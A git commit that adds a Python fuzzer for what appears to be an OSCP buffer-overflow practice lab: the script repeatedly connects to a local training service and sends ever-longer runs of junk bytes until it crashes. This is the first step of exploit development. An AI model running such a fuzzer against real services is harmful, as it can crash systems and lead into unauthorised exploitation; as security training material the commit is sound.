0fac5b80428cce370c09e64357b1cd35f3d780fb
0x3klavya <gaurav0000r@gmail.com>
2024-05-03 23:23:08 +0530

    Signed-off-by: 0x3klavya <gaurav0000r@gmail.com>

---
+++ oscp/OVERFLOW2/fuzzer.py
@@ -0,0 +1,25 @@
+#! /usr/bin/python3
+
+import socket, time, sys
+
+IP = '192.168.56.1'
+PORT = 1337
+
+prefix = b'OVERFLOW1 '
+buffer = b'A' * 100
+
+payload = prefix + buffer
+
+while True:
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(3)
+            s.connect((IP, PORT))
+            print('Fuzzing with {} bytes of junk' .format(len(payload) - len(prefix))) 
+            s.send(payload)
+            s.recv(1024)
+    except:
+        print('Fuzzing crashed at {} bytes' .format(len(payload) - len(prefix)))
+        sys.exit(0)
+    time.sleep(1)
+    payload += b"A" * 100
